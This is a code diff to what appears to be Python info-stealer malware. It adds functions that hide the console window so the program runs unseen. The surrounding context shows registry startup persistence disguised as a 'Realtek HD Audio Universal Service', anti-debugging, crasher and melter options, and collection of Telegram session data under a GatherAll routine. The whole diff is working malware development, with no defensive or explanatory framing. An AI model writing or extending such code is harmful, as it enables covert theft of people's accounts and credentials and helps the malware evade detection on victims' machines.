@@ -25,6 +25,7 @@ DiscordStop = '%Close%'
 OneTimeSteal = '%Onetime%'
 melter = '%Melter%'
 crasher = '%Crash%'
+hidewindow = '%Hide%'
 
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
@@ -314,7 +315,21 @@ def add_to_startup(new_path):
     open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
     winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {addrs}")
 
+def hide_console1():
+    kernel32 = ctypes.WinDLL("kernel32.dll")
+    user32 = ctypes.WinDLL("user32.dll")
+    get_console_window = kernel32.GetConsoleWindow
+    show_window = user32.ShowWindow
+    hwnd = get_console_window()
+    show_window(hwnd, 0)
 
+def hide_console2():
+    user32 = ctypes.WinDLL("user32.dll")
+    get_foreground_window = user32.GetForegroundWindow
+    show_window = user32.ShowWindow
+    hwnd = get_foreground_window()
+    show_window(hwnd, 0)
+    
 
 def startup():
     try:
@@ -1950,7 +1965,12 @@ def GatherAll():
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
-    
+    if hidewindow == True:
+        try:
+            hide_console1()
+            hide_console2()
+        except:
+            pass
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
